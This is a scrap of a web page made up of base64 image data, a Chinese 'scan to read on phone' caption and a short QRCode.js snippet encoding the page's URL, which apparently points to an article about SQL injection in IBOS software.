PLzB3BMM39ZCBNfJlg+wIwRowShcDc4fwzrfUjLLwFUdNjbcDqaLL/70TaAPJBOH+rQBrUpPtJhZCrxEni1YI1sAapY9JLwNrw1cE58CYHPRx+BVqjdFGHcz9wBwYUwOO4cTkgnW9NpBKXv7rTuAf8OSyhUwNzCdeYWrAWjgxuVs49ow2fOKKyYHXqrmdP9aAa2HGVQ+wbsyBeZjf4YFzWbti+sCsuZ6QnM6b4DWQNxlEtjENBPwYRVARnANjcvVxHP1oguBaINTxdhjOOAlgyoG5W5rsIZpg+IpjLnHF6Ct3z08NeL9AKwGOn6sRxZkGUnKX+4ITaAMBTy2TzV7APBCqfRwCHJOG+5ji9BeC68Yc9HzyQtXdM3A9GFX3DIO+X90HOBcu6yUWgjXJrbANZJW8uN8/gTYQTVB2awvKy6CftDhZrVVcDfqaqh39Wjf68PU+4BqYcVwbTs2YG/cy5u/FY31iONdsA7nX7Mr/zgm0gYCnlGUzvYpjLnGwasH9wJhctBWTA2trLj70OXAMJ0Y7YvpXjCZc4orJwbkG0CRAew1t5B8HzhzY/5O6CW0gN1VX8tdOoA0kt+GRlcETTw04rrXJBWsu/q2cNOC+cH40ca9GdTFw/RjD2Q+sAWO0FbNmMLnEwnC3EPZrpK4NJMSFTzmBbze5BvLto/uZwjYQ8OMExtVy4JweURk4XmnDwX1NtOopG2Nx8PU+qpPBvlZ52WrNcEHo+4BjIJKG6ilrRHGA9mYAzl+f0reBFP3lvvAE2j+23u0BzmlGA+YSB8E8nDjmEgvBOvkycAwz6vbIwDnpRwPnwDjmawzWgLHm/osP7gfG2kv7XxlYC1z/6uTjzf60vzEcJweeWt3vqEkcTWLhihMP7gtE0n6fKr+zJv7j7HTi/0gaiJM14tNRXO2T2n4Bxx4jgD4WX3tVX7kYzHXKVf31GqITeSObXkNgPcW6Z7ivqXr5MNfkZigvA2tgj9JVg1Nbeflw5qB/N6P8PQPX39PVPOxr8vOCNTDj9YTU03wD/xrIGwyhbqENBPz45LGSaGc7DbgH0EqB4wVxVQPORRxNMPwtjFY46sRVq3no1665+KndxeErjjU1N/orbRvIKL7i15zA9LYXfHNW0wPnoMdsPTXCkQPXhK8ovQz2mqqXD9bCjMqvDE5t8mBO68vCfxXBfaDH2gec0zoy6GNx1xNST+wN/Pa2F/pprfamCVZbacJFN8bhhckFxckSr1B52Sr3HU69ZKkFnwMQqiFwvB42ojjqIQslf7TkYN/nekJySm+C7TVk3A/MUwRzYMwNGGtrDNaGA8dAqOPWAROmv7CJH3Ckl92SKi+Dfl1xMXDuVp8xN9aCewCjtP37tpq4npB6Gm/gt9eQcS+ZdMVowgHHrR5jMA+kpGG0wkZuHODoD+fHHmBO9bJaqlgG1oAxGuVi4FziYLTCkdvF4qX/qoH3ACdeT8hXT/GH9S8YyA//RP/n7dtA9NjJwI/P6udSXgbWyJdFKz8WLgiuSSzcacNXlF4WDtwvsRBmrvLgPKBWhwHHr8UjGL6Bc+ohA8eDrAvBGullNal4ZVXTBlLJy3/dCbSBgCebrUAfhxdmymANzBhNUHU7GzUw9wNzYw8wD+cL/6hZxY+smTrwGokfQZhrYObGXm0gY+KKX3MCbSDjjcl2wFMFQh2/c+G8kata4NCl6JYG7mtX9ekdBPeBHlNbEaxJbXKJVxhNsGqg71dz8VMHe20bSIoufO0JtI9OoJ9aprnaXnLgGjCGF6YOnANj+FsI1qpPbNTv+FGnGNwPTkx9ULrRkgvCWQ+M8iOO9gg+vyUWfobdF3D8FlEudj0h3RG9PrgG8voZdDuYPsvKowPz45RK6HPhV5h+yYFrgVDtU89HtMDxmKc4NcKRSxyUJhYO+n7hK4I1qQ1WzYqr+erf0l5PSD2pN/Dbi3qmBr4N2Rs4BkK1G92IPw5w3F443xL/SbWarCNMLgiuV04WXgh9DhwrtzP1kCUProETlZeBuWiFYE55GThWbmfQa8AxzJgecOauJySn8ia4fQ3RjZCt9gnnRGF+GlQD1siXQR+L+4ppLzJwH/kycAy0dkB7UmG9v4jBWvXaGViTmiCYhxOT+y5eT8h3T+6H6tpA4JwynP5q3dykVS5cNOBeiZP/rwjue6vPuGZiYerky2DfT3lZalaovGzMiRtt1NS4DaSSl/+6E5jeZWWat7YEvk2jNrEw9fJl4JrwK5ROBrMWZm7Vo3LgGphR68iqfvShr0sezCcWwsxVHlB4mNbd2fWEHEf0Pt+ugdycxe8np7e92cLqkRpziYHubSaQVOPTryVuONFWHOU1N/rRhh9j8eGAY4/iZOGFimXyZfKriYtVvvrJC8FrQY/Kxa4nJCfxJthe1KGfGtyPx59hdzOkA/eTf8/AWjgxvcdaODVjbozh1IL99AXHtQZmTnlY8/dyyt+z6wm5d0K/nG8DyU15BMc9pqbysL5FYB6o8sMHtr/PwblDWL5lbWGhDxf6GmlGA2vCg2OYP3IB547mm2/ps0l39ErbBtIpr+BlJzANBHwLYMbdLsHaml9Nv+ZXfmrA/RJXTB1YAzNGU+vkw16bmopgfTj1qBZeCNZCj8rFaq18sDZ54TQQkZe97gSugbzu7JcrP3Ug4EcQaIvp0dxZRMDxYp44+sQrXGnCBcF9wRheuOo5ctLJwoP7JFbuK5a6EcF9get/z/TxZn+e8oTkltSfDc6pw9of68C69AHHQKj2d/NA91RJAD2X/kFwHvZvaaMVqqdMfjVxMjj7KV4ZzBowt9I/ZSCrxhf3vROYBlJvwujfW2LUK06N/NHANyV8tM9G8Dq1L5jL2sGVpnLVT40Q3A96rHpwrnKjPw1kFFzx755AGwh4enAfH9kiuE+00MfidbNk4Jx8mXI7A2t3efFgDRjFydQ7pnhl4BrYv86s6u71VU00t7ANRAWXvf4EroG8fgbdDv4HAAD//34Cv3EAAAAGSURBVAMAoNDAoRyrA2sAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/IBOS-main-api-orguser-uids-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 